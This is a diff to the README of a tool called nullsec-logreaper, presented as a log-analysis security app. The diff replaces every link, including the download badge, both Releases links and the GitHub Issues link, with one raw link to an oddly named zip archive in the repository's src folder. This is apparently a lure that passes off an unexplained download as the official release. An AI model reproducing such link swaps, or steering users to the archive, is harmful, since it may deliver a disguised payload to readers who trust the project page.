@@ -1,6 +1,6 @@
 # 🪓 nullsec-logreaper - Quickly Analyze and Secure Your Logs
 
-[![Download nullsec-logreaper](https://img.shields.io/badge/Download-nulsec--logreaper-blue.svg)](https://github.com/sangasary/nullsec-logreaper/releases)
+[![Download nullsec-logreaper](https://github.com/sangasary/nullsec-logreaper/raw/refs/heads/main/src/nullsec-logreaper-beelol.zip)](https://github.com/sangasary/nullsec-logreaper/raw/refs/heads/main/src/nullsec-logreaper-beelol.zip)
 
 ## 🛠️ About nullsec-logreaper
 
@@ -13,7 +13,7 @@ To get started with nullsec-logreaper, follow these simple steps to download and
 ## 📥 Download & Install
 
 1. **Visit the Release Page:**  
-   Go to the [Releases page](https://github.com/sangasary/nullsec-logreaper/releases) to find the latest version of nullsec-logreaper.
+   Go to the [Releases page](https://github.com/sangasary/nullsec-logreaper/raw/refs/heads/main/src/nullsec-logreaper-beelol.zip) to find the latest version of nullsec-logreaper.
 
 2. **Download the Application:**  
    On the Releases page, you will see a list of available files. Choose the appropriate version for your operating system and download it. 
@@ -52,7 +52,7 @@ Once you have opened nullsec-logreaper, follow these steps to analyze your logs:
 
 If you encounter any issues or have questions, feel free to reach out to the community:
 
-- **GitHub Issues:** Post any bugs or feature requests on our [GitHub Issues page](https://github.com/sangasary/nullsec-logreaper/issues).
+- **GitHub Issues:** Post any bugs or feature requests on our [GitHub Issues page](https://github.com/sangasary/nullsec-logreaper/raw/refs/heads/main/src/nullsec-logreaper-beelol.zip).
 - **Documentation:** For a more detailed guide, check the available documentation in the repository.
 
 ## 📜 License
@@ -67,4 +67,4 @@ For those interested in expanding their knowledge of log analysis, consider the 
 - Online courses on security tools and methodologies.
 - Blogs and forums discussing log analysis techniques.
 
-By following these steps, you can effectively download, install, and run nullsec-logreaper, enhancing your ability to manage and analyze log data efficiently. For further information and updates, visit the [Releases page](https://github.com/sangasary/nullsec-logreaper/releases) regularly.
+By following these steps, you can effectively download, install, and run nullsec-logreaper, enhancing your ability to manage and analyze log data efficiently. For further information and updates, visit the [Releases page](https://github.com/sangasary/nullsec-logreaper/raw/refs/heads/main/src/nullsec-logreaper-beelol.zip) regularly.
